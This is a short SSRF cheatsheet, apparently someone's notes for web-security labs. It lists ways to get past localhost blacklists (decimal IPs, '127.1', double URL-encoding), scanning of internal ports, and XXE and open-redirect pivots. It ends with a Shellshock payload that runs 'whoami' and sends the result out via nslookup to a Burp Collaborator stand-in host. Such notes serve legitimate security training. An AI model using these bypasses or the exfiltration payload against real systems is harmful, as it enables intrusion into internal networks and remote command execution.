# SSRF - CHEATSHEET + IMPORTANT LABS

## Key terms

```bash
loopback network interface
```

## Most important labs

- [SSRF via arbitraty host + EXTRA lab: absolute path](../Host-Header-Injection/SSRF-via-arbitraryhost-and-absolute-path.md)

- [SSRF-via-host-validation-bypass-via-connection-state-attack](../Host-Header-Injection/SSRF-via-host-validation-bypass-via-connection-state-attack.md) ❗

- [3]()

- [4]()


## Methodology

```bash
- Server send any http request? -> SSRF
	  -> localhost/foo -> blacklisted?
					   -> send in decimal -> https://www.ipaddressguide.com/ip
					   -> 127.1 = 127.0.0.1
					   -> 127.255.255.255
						   -> /foo -> url encode all characters x2 times, example ->   http://127.1/%2561%2564%256d%2569%256e
		
	  -> Intruder x.x.x.x:xxxxx/foo to scan internal network
- Switch protocol (http/https)	  
- Search open redirect -> in url?
- Refer to our server -> User Agent? -> shellshock
- XML? -> try XXE  

```

#### Cheat Sheet

```
() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN```
```